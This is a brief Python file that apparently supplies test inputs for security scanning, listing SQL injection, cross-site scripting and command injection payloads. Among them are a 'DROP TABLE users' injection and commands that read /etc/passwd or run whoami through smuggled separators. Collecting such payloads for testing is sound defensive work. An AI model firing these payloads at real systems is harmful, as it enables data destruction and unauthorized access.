SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT 1,2,3--",
    "'; DROP TABLE users--"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert('XSS')"
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| whoami",
    "&& cat /etc/passwd"
]